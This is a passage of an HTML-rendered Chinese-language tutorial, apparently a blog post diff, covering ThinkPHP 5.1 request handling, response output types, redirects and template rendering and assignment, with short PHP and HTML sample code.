dump(request()-&gt;has(<span class="string">'url'</span>));</div><div class="line"></div><div class="line">        dump(request()-&gt;only([<span class="string">'url'</span>]));</div><div class="line"></div><div class="line">        dump(request()-&gt;except(<span class="string">'url'</span>));</div><div class="line"></div><div class="line">        dump(request()-&gt;get());</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-args-07.png" alt="thinkphp-http-args-07"></p>
+<h3 id="HTTP请求响应"><a href="#HTTP请求响应" class="headerlink" title="HTTP请求响应"></a>HTTP请求响应</h3><p>thinkphp默认以<code>html</code>格式输出响应内容,在框架的app.php中可以看到：<br><img src="/2020/01/19/thinkphp/thinkphp-resp-01.png" alt="thinkphp-httpresp-01"></p>
+<p>更改<code>default_return_type</code>参数可以改变输出的格式。</p>
+<p>当然一般情况下，我们不直接更改配置文件，thinkphp为每一种输出类型提供了不同的Response子类，我们可以直接调用函数，来完成不同格式的输出。</p>
+<table>
+<thead>
+<tr>
+<th>输出类型</th>
+<th>快捷方法</th>
+<th>对应Response类</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTML输出</td>
+<td>response</td>
+<td>\think\Response</td>
+</tr>
+<tr>
+<td>渲染模板输出</td>
+<td>view</td>
+<td>\think\response\View</td>
+</tr>
+<tr>
+<td>JSON输出</td>
+<td>json</td>
+<td>\think\response\Json</td>
+</tr>
+<tr>
+<td>JSONP输出</td>
+<td>jsonp</td>
+<td>\think\response\Jsonp</td>
+</tr>
+<tr>
+<td>XML输出</td>
+<td>xml</td>
+<td>\think\response\Xml</td>
+</tr>
+<tr>
+<td>页面重定向</td>
+<td>redirect</td>
+<td>\think\response\Redirect</td>
+</tr>
+<tr>
+<td>附件下载（V5.1.21+）</td>
+<td>download</td>
+<td>\think\response\Download</td>
+</tr>
+</tbody>
+</table>
+<p>例如：返回JSON数据</p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"json格式返回: "</span>;</div><div class="line"></div><div class="line">        $data = [<span class="string">'name'</span> =&gt; <span class="string">'lxh'</span>, <span class="string">'url'</span> =&gt; <span class="string">'www.lxhsec.com'</span>];</div><div class="line">        <span class="keyword">return</span> json($data);</div><div class="line">        </div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-resp-02.png" alt="thinkphp-httpresp-02"></p>
+<p>返回html数据：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"html格式返回: "</span>;</div><div class="line"></div><div class="line">        $data = <span class="string">'Hello,www.lxhsec.com!'</span>;</div><div class="line">        <span class="keyword">return</span> response($data);</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>或者使用return直接返回输出的字符串（前提是你的default_return_type设置是html）。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"html格式返回: "</span>;</div><div class="line"></div><div class="line">        $data = <span class="string">'Hello,www.lxhsec.com!'</span>;</div><div class="line">        <span class="keyword">return</span> $data;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="响应参数"><a href="#响应参数" class="headerlink" title="响应参数"></a>响应参数</h4><p>以json为例子，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">json(响应数据，HTTP状态码，响应头)</div></pre></td></tr></table></figure></p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"json格式返回: "</span>;</div><div class="line"></div><div class="line">        $data = [<span class="string">'name'</span> =&gt; <span class="string">'lxh'</span>, <span class="string">'url'</span> =&gt; <span class="string">'www.lxhsec.com'</span>];</div><div class="line">        <span class="keyword">return</span> json($data,<span class="number">201</span>,[<span class="string">'key'</span>=&gt;<span class="string">'value'</span>,<span class="string">'key1'</span>=&gt;<span class="string">'value1'</span>]);</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-resp-03.png" alt="thinkphp-httpresp-03"></p>
+<h4 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h4><p>可以使用redirect助手函数进行重定向。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">redirect(&apos;地址或方法名&apos;,数组参数);</div></pre></td></tr></table></figure></p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"重定向: "</span>;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> redirect(url(<span class="string">'demo/test/req1'</span>,[<span class="string">'id'</span>=&gt;<span class="string">'1'</span>]));</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req1</span><span class="params">($id)</span></span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">"id: "</span>.$id;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-resp-04.png" alt="thinkphp-httpresp-04"></p>
+<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><h4 id="模板定义"><a href="#模板定义" class="headerlink" title="模板定义"></a>模板定义</h4><p>系统默认规则自动定位模板文件，其规则是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">当前模块/view/当前控制器名（小写）/当前操作（小写）.html</div></pre></td></tr></table></figure></p>
+<p>例子：</p>
+<p>demo/view/test/req.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    hello lxhsec,url:www.lxhsec.com</div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</div><div class="line"></div><div class="line"><span class="comment">//继承Controller类</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">// 不带任何参数 自动定位当前操作的模板文件(demo/view/test/req.html)</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-view-01.png" alt="thinkphp-view-01"></p>
+<h4 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h4><p>渲染模板最常用的是控制器类在继承系统控制器基类（\think\Controller）后调用fetch方法，调用格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fetch(&apos;[模板文件]&apos;[,&apos;模板变量（数组）&apos;])</div></pre></td></tr></table></figure></p>
+<p>模板文件的写法支持下面几种：</p>
+<table>
+<thead>
+<tr>
+<th>用法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>不带任何参数</td>
+<td>自动定位当前操作的模板文件</td>
+</tr>
+<tr>
+<td>[模块@][控制器/][操作]</td>
+<td>常用写法，支持跨模块</td>
+</tr>
+<tr>
+<td>完整的模板文件名</td>
+<td>直接使用完整的模板文件名（包括模板后缀）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>跨模块渲染模板</strong></p>
+<p>req2.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">lxh  req2.html</div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">// 跨模块渲染模板</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">'index@kuamuban/req2'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-view-02.png" alt="thinkphp-view-02"></p>
+<p><strong>完整的模板文件名</strong></p>
+<p>req2.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">lxh  req666.html</div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">// 完整的模板文件名</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">'../public/template/req666.html'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-view-03.png" alt="thinkphp-view-03"></p>
+<h4 id="模板赋值"><a href="#模板赋值" class="headerlink" title="模板赋值"></a>模板赋值</h4><p>传递数据到模板输出</p>
+<h5 id="assign方法"><a href="#assign方法" class="headerlink" title="assign方法"></a>assign方法</h5><p>在控制器继承了系统的控制器基类的情况下，可以使用assign方法进行模板变量赋值.</p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">// 模板变量赋值</span></div><div class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="string">'name'</span>,<span class="string">'lxhsec'</span>);</div><div class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="string">'email'</span>,<span class="string">'lxhsec@outlook.com'</span>);</div><div class="line"><span class="comment">//        // 或者批量赋值</span></div><div class="line"><span class="comment">//        $this-&gt;assign([</span></div><div class="line"><span class="comment">//            'name'  =&gt; 'lxhsec',</span></div><div class="line"><span class="comment">//            'email' =&gt; 'lxhsec@outlook.com''</span></div><div class="line"><span class="comment">//        ]);</span></div><div class="line">        <span class="comment">// 模板输出</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">'demo@test/req1'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>req1.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    hello &#123;$name&#125;, email: &#123;$email&#125;.</div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-view-06.png" alt="thinkphp-view-06"></p>
+<h5 id="方法传入参数"><a href="#方法传入参数" class="headerlink" title="方法传入参数"></a>方法传入参数</h5><p>方法fetch 及 display 均可传入模板变量，例如:</p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">// 模板输出</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">'demo@test/req1'</span>,[</div><div class="line">            <span class="string">'name'</span>  =&gt; <span class="string">'lxhsec'</span>,</div><div class="line">            <span class="string">'email'</span> =&gt; <span class="string">'lxhsec@outlook.com'</span></div><div class="line">        ]);</div><div class="line"></div><div class="line"><span class="comment">//        $content = 'hello &#123;$name&#125;, email: &#123;$email&#125;.';</span></div><div class="line"><span class="comment">//        return $this-&gt;display($content, [</span></div><div class="line"><span class="comment">//            'name'  =&gt; 'lxhsec',</span></div><div class="line"><span class="comment">//            'email' =&gt; 'lxhsec@outlook.com'</span></div><div class="line"><span class="comment">//        ]);</span></div><div class="line">        </div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h5 id="助手函数-2"><a href="#助手函数-2" class="headerlink" title="助手函数"></a>助手函数</h5><p>如果使用view助手函数渲染输出的话，可以使用下面的方法进行模板变量赋值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">// view 与$this-&gt;fetch相似。</span></div><div class="line">        <span class="keyword">return</span> view(<span class="string">'demo@test/req1'</span>,[</div><div class="line">            <span class="string">'name'</span>  =&gt; <span class="string">'lxhsec'</span>,</div><div class="line">            <span class="string">'email'</span> =&gt; <span class="string">'lxhsec@outlook.com'</span></div><div class="line">        ]);</div><div class="line">        </div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h5 id="compact方式"><a href="#compact方式" class="headerlink" title="compact方式"></a>compact方式</h5><p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">// view</span></div><div class="line">        $name =<span class="string">'lxhsec'</span>;</div><div class="line">        $email = <span class="string">'lxhsec@outlook.com'</span>;</div><div class="line">        <span class="keyword">return</span> view(<span class="string">'demo@test/req1'</span>,compact(<span class="string">'name'</span>,<span class="string">'email'</span>));</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="助手函数-3"><a href="#助手函数-3" class="headerlink" title="助手函数"></a>助手函数</h4><p>如果你的控制器并未继承系统的控制器基类，则使用系统提供的助手函数<code>view</code>，可以完成相同的功能。</p>
+<p>助手函数调用格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">view(&apos;[模板文件]&apos;[,&apos;模板变量（数组）&apos;])</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-view-04.png" alt="thinkphp-view-04"></p>
+<h4 id="渲染内容"><a href="#渲染内容" class="headerlink" title="渲染内容"></a>渲染内容</h4><p>如果希望直接解析内容而不通过模板文件的话，可以使用display方法。</p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">// 渲染标签，不通过模板</span></div><div class="line"><span class="comment">//        return $this-&gt;display("hello lxhsec");</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;display(<span class="string">"&#123;php&#125;echo 'hello lxhsec';&#123;/php&#125;"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
